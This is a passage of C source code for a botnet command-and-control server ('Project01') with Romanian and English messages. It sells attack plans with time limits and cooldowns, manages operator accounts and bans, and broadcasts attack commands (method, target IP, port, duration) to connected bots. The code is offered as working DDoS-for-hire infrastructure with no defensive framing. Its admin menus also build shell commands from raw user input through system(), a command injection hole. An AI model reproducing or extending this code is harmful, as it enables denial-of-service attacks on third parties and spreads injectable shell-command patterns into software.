					if(send(datafd, options, strlen(options), MSG_NOSIGNAL) == -1) goto end;
					memset(buf, 0, sizeof(buf));
					if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
					trim(buf);
			
					if(strstr(buf, "1") || strstr(buf, "unu") || strstr(buf, "One") || strstr(buf, "one"))
					{
						char username1[80];
						char password1[80];
						char status1[80];
						char maxtime1[80];
						char cooldown1[80];
						char newexpiry[800];
						char send1[1024];
						sprintf(usethis, "\e[38;5;190mUsername:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(username1, buf);
			
						sprintf(usethis, "\e[38;5;190mPassword:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(password1, buf);
			
						sprintf(usethis, "\e[38;5;190madmin(da sau nu):");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						
						if(strstr(buf, "y") || strstr(buf, "Y") || strstr(buf, "yes") || strstr(buf, "da") || strstr(buf, "DA"))
						{
							strcpy(status1, "admin");
							strcpy(maxtime1, "160");
							strcpy(cooldown1, "10");
							strcpy(newexpiry, "9/99/9999");
							goto thing;
						} 
			
						sprintf(usethis, "   \e[38;5;54m╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[38;5;124m Basic \e[38;5;54m║ ║ \e[38;5;124m VIP \e[38;5;54m ║ ║\e[38;5;124m  MVP \e[38;5;54m ║\r\n   \e[38;5;54m╚═══════╝ ╚═══════╝ ╚═══════╝\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			
						sprintf(usethis, "\e[38;5;190mPlan:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
			
						if(strstr(buf, "BASIC") || strstr(buf, "Basic") || strstr(buf, "basic"));
						{
							strcpy(maxtime1, "60");
							strcpy(cooldown1, "60");
							strcpy(status1, "Basic");
						}
			
						if(strstr(buf, "VIP") || strstr(buf, "Vip") || strstr(buf, "vip"))
						{
							strcpy(maxtime1, "120");
							strcpy(cooldown1, "80");
							strcpy(status1, "Vip");
						}
						
						if(strstr(buf, "MVP") || strstr(buf, "Mvp") || strstr(buf, "mvp"))
						{
							strcpy(maxtime1, "160");
							strcpy(cooldown1, "60");
							strcpy(status1, "MVP");				
						}				
						sprintf(usethis, "\e[38;5;190mUsage: DD/MM/YY\r\nExpira:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0,sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(newexpiry, buf);
						thing:
						sprintf(cmd1, "%s %s %s %s %s %s", username1, password1, status1, maxtime1, cooldown1, newexpiry);
						sprintf(send1, "echo '%s' >> users/login.txt", cmd1);
						system(send1);
						sprintf(usethis, "\e[38;5;190mCONT [%s] ADAUGAT\r\n", username1);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s A adaugat useru: [%s] Plan: [%s]\n", managements[datafd].id, username1, status1);
			
					}
					else if(strstr(buf, "2") || strstr(buf, "doi") || strstr(buf, "Two") || strstr(buf, "two"))
					{
						char removeuser[80];
						char sys[800];
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(removeuser, buf);
						sprintf(sys,"sed '/\\<%s\\>/d' -i users/login.txt", removeuser);
						system(sys);
						sprintf(usethis, "\e[38;5;190mAccount [%s] Has Been Removed\r\n", removeuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s A sters useru: [%s]\n", managements[datafd].id, removeuser);
					}
					else if(strstr(buf, "3") || strstr(buf, "trei") || strstr(buf, "Three") || strstr(buf, "three"))
					{
						char banuser[80];
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(banuser, buf);
						sprintf(send1, "echo '%s' >> logs/BANNEDUSERS.txt", banuser);
						system(send1);
						sprintf(usethis, "\e[38;5;190mAccount [%s] Has Been Banned\r\n", banuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s A banat useru: [%s]\n", managements[datafd].id, banuser);
					}
					else if(strstr(buf, "4") || strstr(buf, "patru") || strstr(buf, "Four") || strstr(buf, "four"))
					{
						char sys[800];
						char unbanuser[80] ;
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(unbanuser, buf);
						sprintf(sys,"sed '/\\<%s\\>/d' -i logs/BANNEDUSERS.txt", unbanuser);
						system(sys);
						sprintf(usethis, "\e[38;5;190mAccount [%s] Has Been UnBanned\r\n", unbanuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s A debanat useru: [%s]\n", managements[datafd].id, unbanuser);
					}
					else if(strstr(buf, "5") || strstr(buf, "cinci") || strstr(buf, "Five") || strstr(buf, "five"))
					{
						char ipbanuser[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(ipbanuser, buf);
						sprintf(send1, "echo '%s' >> logs/IPBANNED.txt",ipbanuser);
						system(send1);
						sprintf(usethis, "\e[38;5;190m[%s] Has Been IP Banned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s IP Banned: [%s]\r\n", managements[datafd].id, ipbanuser);
					}
					else if(strstr(buf, "6") || strstr(buf, "sase") || strstr(buf, "Six") || strstr(buf, "six"))
					{
						char sys[800];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						sprintf(sys, "sed '/\\<%s\\>/d' -i logs/IPBANNED.txt", buf);
						system(sys);
						sprintf(usethis, "\e[38;5;190m[%s] Has Been UnIPBanned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s UnIPBanned: [%s]\n", managements[datafd].id, buf);
					}
			
					else if(strcasestr(buf, "7") || strcasestr(buf, "seven"))
					{	
						int fail;
						char usertokick[800];
						sprintf(usethis, "Useri Online\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						int kickonline;
						for(kickonline=0;kickonline < MAXFDS;kickonline++)
						{
							if(strlen(managements[kickonline].id) > 1 && managements[kickonline].connected == 1)
							{
								char kickonlineusers[800];
								sprintf(kickonlineusers, "| %s |\r\n", managements[kickonline].id);
								if(send(datafd, kickonlineusers, strlen(kickonlineusers), MSG_NOSIGNAL) == -1) goto end;
							}
						}
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(usertokick, buf);
			
						for(kickonline=0;kickonline<MAXFDS;kickonline++)
						{
							if(!strcmp(managements[kickonline].id, usertokick))
							{
								sprintf(usethis, "\r\n\e[38;5;190mProject01: Ai primit KICK!\r\n");
								if(send(kickonline, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								sent = 1;
								sleep(1);
								memset(managements[kickonline].id,0, sizeof(managements[kickonline].id));
								OperatorsConnected--;
								managements[kickonline].connected = 0;
								close(kickonline);
							}
						}
						if(sent != NULL)
						{
							sprintf(usethis,"\e[38;5;190mUseru %s A primit KICK!\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
							printf("[Project01]:%s Kicked User: [%s]\r\n", managements[datafd].id, usertokick);
						}
			
						else if(!sent)
						{
							sprintf(usethis, "\e[38;5;190mUseru %s nu e ONLINE...\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						}
					}
			
					else if(strstr(buf, "8"))
					{
						char Blacklistip[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(Blacklistip, buf);
						sprintf(send1, "echo '%s' >> logs/Blacklist.txt",Blacklistip);
						system(send1);
						sprintf(usethis, "\e[38;5;190m[%s] Has Been Blacklisted\r\n", Blacklistip);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Project01]:%s Blacklisted IP: [%s]\r\n", managements[datafd].id, Blacklistip);
					}
					else if(strstr(buf, "cls"));
					{
						//
					}
				} else {
			 		char noperms[800];
			 		sprintf(noperms, "\e[38;5;190mNu ai Administrator!   - add user\r\n");
			 		if(send(datafd, noperms, strlen(noperms), MSG_NOSIGNAL) == -1) goto end;
				}
			}

        	if(strcasestr(buf, "motd"))
 			{
				if(managements[datafd].adminstatus == 1)
        	    {
        	   		char sendbuf[50]; 
 					memset(buf, 0, sizeof(buf));
 					sprintf(sendbuf, "\e[38;5;54mMOTD: "); 
 					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 					fdgets(buf, sizeof(buf), datafd);
 					trim(buf);
 					if(strlen(buf) < 80)
 					{
 							motdaction = 1;
 							strcpy(motd, buf);
 							sprintf(usethis, "\e[38;5;190mMOTD Updatat\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							printf("[Project01]:%s A setat MOTD ca: %s\n", motd);
 					}
				}
				else
				{
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;190mNu ai Administrator! - MOTD\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				}
				
 			}


 			else if(strcasestr(buf, "broadcast"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					int brdcstthing;
 					int userssentto = 0;
 					int msgoff = 0;
 					sprintf(usethis, "MSG:");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					memset(buf, 0, sizeof(buf));
 					if(fdgets(buf, sizeof(buf), datafd) > 1) goto end;
 					trim(buf);
 					strcpy(broadcastmsg, buf);
 					memset(buf,0,sizeof(buf));
 						if(strlen(broadcastmsg) < 80)
 						{
 							if(OperatorsConnected > 1)
 							{
 								for(brdcstthing=0;brdcstthing<MAXFDS;brdcstthing++)
 								{
 									if(managements[brdcstthing].connected == 1 && strcmp(managements[brdcstthing].id, managements[datafd].id) != 0)
 									{
 										if(managements[brdcstthing].broadcasttoggle == 0)
 										{
 											sprintf(usethis, "\r\n\e[38;5;190mBroadcasted Message From %s\r\nMSG: %s\r\n", managements[datafd].id, broadcastmsg);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		
 											sprintf(usethis, "\e[92m%s@\e[38;5;88mProject01~#\e[92m", managements[brdcstthing].id);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 											sent = 1;
 											userssentto++;
 										} else {
 											msgoff++;
 										}
 									} else {
 										//
 									}
 								}
 							} else {
 								sprintf(usethis, "\e[38;5;190mMomentan nu sunt useri online\r\n");
 								if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							}
 						} else {
 							sprintf(usethis, "\e[38;5;190mMesajul nu poate depasi 80 Caractere\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						}
	
 						if(sent == 1)
 						{
		
 							sprintf(usethis, "\e[38;5;190mMessage Broadcasted To %d Users | %d Users Have Broadcast Toggled Off\r\n", userssentto, msgoff);
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							sent = 0;
 							printf("[Project01]:%s Sent A Broadcast Message: %s", managements[datafd].id, broadcastmsg, userssentto, broadcastmsg);
 							userssentto = 0;
 							msgoff = 0;
 						}
	
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;190mNu ai Administrator! - BROADCAST\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 		 				
 				}
 			}

 			if(strcasestr(buf, "ToggleListen"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].listenattacks == 0)
 					{
 						managements[datafd].listenattacks = 1;
 						sprintf(usethis, "\e[38;5;190mAttack Listen Has Been turned ON\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Project01]:%s Is Listening To Attacks\n", managements[datafd].id);
 					}
 					else if(managements[datafd].listenattacks == 1)
 					{
 						managements[datafd].listenattacks = 0;
 						sprintf(usethis, "\e[38;5;190mAttack Listen Has Been turned OFF\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Project01]:%s Is No Longer Listening To Attacks\n", managements[datafd].id);
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;190mNu ai Administrator! - TOGGLELISTEN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 				
 				}
 			}

 			else if(strcasestr(buf, "ToggleAttacks"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(AttackStatus == 0)
 					{
        	        			sprintf(usethis, "\e[38;5;190mAi dezactivat atacurile!\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Project01]:%s Has Toggled OFF Attacks\n", managements[datafd].id);
        	        			AttackStatus = 1;
 					} else {
        	        			sprintf(usethis, "\e[38;5;190mAi activat atacurile🚀\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Project01]:%s Has Toggled ON Attacks\n", managements[datafd].id);
        	        			AttackStatus = 0; 					
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;190mNu ai Administrator! - TOGGLEATTACKS\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	 				
 				}
 			}

 			else if(strcasestr(buf, "ToggleLogin"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].LoginListen == 1)
 					{
 						sprintf(usethis, "\e[38;5;190mYou Have Stopped Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Project01]:%s Is Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 0;
 					} else {
 						sprintf(usethis, "\e[38;5;190mYou Have Started Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Project01]:%s Is No Longer Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 1; 				
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;190mNu ai Administrator! - TOGGELLOGIN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	
 				}
 			}


			if(strcasestr(buf, "toggle1"))
			{
				if(managements[datafd].msgtoggle == 0)
				{
					sprintf(usethis, "\e[38;5;190mRecieving Messages Has Been Toggled OFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Project01]:%s Has Turned OFF The Receiving of Private Messages\n", managements[datafd].id);
					managements[datafd].msgtoggle = 1;
				} else {
					sprintf(usethis, "\e[38;5;190mRecieving Messages Has Been Toggled ON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Project01]:%s Has Turned ON The Receiving of Private Messages\n", managements[datafd].id);
					managements[datafd].msgtoggle = 0;		
				}
			}

			if(strcasestr(buf, "toggle2"))
			{
				if(managements[datafd].broadcasttoggle == 0)
				{
					sprintf(usethis, "\e[38;5;190mRecieving Brodcasts Has Been Toggled OFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Project01]:%s Has Turned OFF The Receiving of Broadcasted Messages\n", managements[datafd].id);
					managements[datafd].broadcasttoggle = 1;
				} else {
					sprintf(usethis, "\e[38;5;190mRecieving Brodcasts Has Been Toggled ON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Project01]:%s Has Turned ON The Receiving of Broadcasted Messages\n", managements[datafd].id);
					managements[datafd].broadcasttoggle = 0;		
				}
			}



           	/*hmmif(strstr(buf, "!*"))hmm*/
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= 4)
            			{
            				char jhere[1024];
                			char rdbuf[1024];
                			strcpy(rdbuf, buf); 
                			strcpy(jhere, buf);
                			int argc = 0;
                			unsigned char *argv[10 + 1] = { 0 };
                			char *token = strtok(rdbuf, " ");
                			while(token != 0 && argc < 10)
                			{
                			    argv[argc++] = malloc(strlen(token) + 1);
                			    strcpy(argv[argc - 1], token);
                			    token = strtok(0, " ");
                			} 
                	    
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mCNC: Ai gresit comanda!\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						

                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mCNC: Ai exagerat timpul!\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
		
                				char *line3 = NULL;
								size_t n3 = 0;
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
								        if (strstr(line3, argv[2]) != NULL){
								        	sprintf(usethis, "\e[38;5;190mThe IP %s Is Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f3);
								free(line3);


								/* ENCRYPT STRING FUNCTION TEST 
								char testthing[800];	
								enc(jhere);
								sprintf(testthing, "🚀🚀🚀: %s\n", jhere);
								ENCRYPT STRING FUNCTION TEST */


            					broadcast(buf, 0, "lol");
            					printf("[Project01]:\e[38;5;190m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					int sendattacklisten;
            					for(sendattacklisten=0;sendattacklisten<MAXFDS;sendattacklisten++)
            					if(managements[sendattacklisten].listenattacks == 1 && managements[sendattacklisten].connected == 1)
            					{
            						sprintf(botnet, "\r\n\e[38;5;190m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
								      
            						sprintf(usethis, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[sendattacklisten].id);
            						if(send(sendattacklisten, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            					}    
            					char attacksentrip[80][2048];
            					int rip;
            					sprintf(attacksentrip[23],"\t\e[38;5;54m 英『𝙎𝙀𝙉\e[38;5;124m𝘿𝙄𝙉𝙂』英 \r\n");
            					sprintf(attacksentrip[24],"\t\e[38;5;124m %s trimis pentru %d Secunde la IP: %s\r\n", argv[1], atoi(argv[4]), argv[2]);
  								for(rip=0;rip<30;rip++)
   								{
  									if(send(datafd, attacksentrip[rip], strlen(attacksentrip[rip]), MSG_NOSIGNAL) == -1) goto end;
  								}
  								//if(send(datafd, testthing, strlen(testthing), MSG_NOSIGNAL) == -1) goto end;
  								pthread_t cooldownthread;
  									struct CoolDownArgs argz;

  								pthread_t attackcooldownthread;
  									struct CoolDownArgs yer;
  								if(managements[datafd].mycooldown > 1)
  								{
  									argz.sock = datafd;
  									argz.seconds = managements[datafd].mycooldown;
  									yer.sock = datafd;
  									yer.seconds = atoi(argv[4]);

  									pthread_create(&cooldownthread, NULL, &StartCldown, (void *)&argz);
  									pthread_create(&attackcooldownthread, NULL, &attacktime, (void*)&yer);
  									pthread_create(&title, NULL, &TitleWriter, sock);
  								}

  								if(Sending[datafd].amountofatks >= 3)
  								{
  									sprintf(usethis, "\e[38;5;190mJust Because Your Cooldown Is: %d.\r\nDoesnt Mean You Have To Send An Attack Every time its done.\r\nYou Have %d Attacks Still Running. Chill out.\r\nBc Of That Were Not Sending The Attack!\r\n", managements[datafd].mycooldown, Sending[datafd].amountofatks);
  									if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  								}
  							}
  						} else {
  							sprintf(usethis, "\e[38;5;190mNu poti trimite mai mult de 6 atacuri.\nAi 6 atacuri trimise.\nAsteapta!\n");
  							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  						}
                	} else {
                		sprintf(usethis, "\e[38;5;190mCooldown-ul nu a expirat mai ai: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}
                } else {
                	sprintf(usethis, "\e[38;5;190mCNC: Atacurile sunt momentan dezactivate!\r\n");
                	if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }	

            /* API ATTACK FUNCTION */
            if(strcasestr(buf, "Send")) 
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= 4)
            			{
            				char rdbuf[1024];
               				strcpy(rdbuf, buf); 
            				int argc = 0;
                			unsigned char *argv[10 + 1] = { 0 };
                			char *token = strtok(rdbuf, " ");
                			while(token != 0 && argc < 10)
                			{
                			    argv[argc++] = malloc(strlen(token) + 1);
                			    strcpy(argv[argc - 1], token);
                			    token = strtok(0, " ");
                			} 
			
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mCNC: Ai gresit comanda!\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						
                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mCNC: Ai exagerat timpul!\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
                				char *line4 = NULL;
								size_t n4 = 0;
								FILE *f4 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line4, &n4, f4) != -1){
								        if (strstr(line4, argv[2]) != NULL){
								        	sprintf(usethis, "\e[38;5;190mIP-ul %s e pe Blacklist\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f4);
								free(line4);
								char method[800];
								char ip[800];
								char port[800];
								char time[800];
								strcpy(method, argv[1]);
								strcpy(ip, argv[2]);
								strcpy(port, argv[3]);
								strcpy(time, argv[4]);
								
								sprintf(usethis, "Method: %s IP: %s Port: %s Time: %s", method, ip, port, time);
								if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
							}
						} else {
  							sprintf(usethis, "\e[38;5;190mYou Cant Send More Than 6 Attacks.\nYou Have 6 current attacks being sent.\nCalm down!\n");
  							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  						}
                	} else {
                		sprintf(usethis, "\e[38;5;190mCooldown-ul nu ti-a expirat mai ai: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}		
				} else {
                	sprintf(usethis, "\e[38;5;190mCNC: Atacurile sunt momentan oprite!\r\n");
                	if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }
            /* END API ATTACK FUNCTION */

            else if(strcasestr(buf, "logoff") || strcasestr(buf, "quit") || strcasestr(buf, "iesi"))
            {	
            	char logout[800];
            	sprintf(logout, "𝓓𝓲𝓼𝓬𝓸𝓷𝓷𝓮𝓬𝓽𝓲𝓷𝓰...\r\n");
            	if(send(datafd, logout, strlen(logout), MSG_NOSIGNAL) == -1) goto end;
            	sleep(2);
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);
            }



            else if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				if(strlen(motd) > 2)
				{
					sprintf(banner0,  "\e[38;5;54mMOTD:\e[38;5;124m %s\r\n", motd); 
					if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
				}
					if(send(datafd, banner13, strlen(banner13), MSG_NOSIGNAL) == -1) goto end;
			}
	}

	pthread_create(&title, NULL, &TitleWriter, sock);


		if(strlen(buf) > 120)
			{
				sprintf(usethis, "NU MAI INCERCA SA DAI CRASH CNC-ului!");
				printf("%s A INCERCAT SA DEA CRASH CNC-ului!\n", managements[datafd].id);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				memset(buf, 0, sizeof(buf));
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);

			}
	char input[800];
    sprintf(input, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
	if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;

}

   


		end:
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						gay[datafd].just_logged_in = 0;
						sprintf(usethis, "\r\n\e[38;5;190m%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						printf("[Project01]:%s Plan: [%s] Just Logged Out!\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
		managements[datafd].connected = 0;
		memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
		ciu(cryptm);
        int s, threads, port, parent;
	    parent = fork();
